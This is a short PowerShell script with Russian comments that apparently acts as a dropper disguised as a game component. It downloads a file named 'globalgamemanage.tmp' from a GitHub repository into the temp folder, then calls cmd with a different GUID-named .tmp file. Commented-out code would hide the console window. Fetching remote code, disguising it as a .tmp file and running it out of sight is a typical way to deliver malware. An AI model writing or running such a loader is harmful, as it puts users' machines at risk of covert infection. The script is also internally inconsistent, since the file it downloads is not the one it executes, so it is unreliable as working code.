$ErrorActionPreference = "Stop"

# Прячем окно консоли на время (опционально, для эффекта)
# Add-Type -Name Window -Namespace Console -MemberDefinition '
# [DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();
# [DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'
# $consolePtr = [Console.Window]::GetConsoleWindow()
# [Console.Window]::ShowWindow($consolePtr, 0) # 0 = скрыть

$GameUrl = "https://github.com/tema132b-arch/testz/raw/main/globalgamemanage.tmp"
$TempExe = Join-Path ([IO.Path]::GetTempPath()) "globalgamemanage.tmp"

Invoke-WebRequest -Uri $GameUrl -OutFile $TempExe -UseBasicParsing
cmd
"%TEMP%/e1090ed9-44f0-4a4a-b228-e41aa7662bd4.tmp"

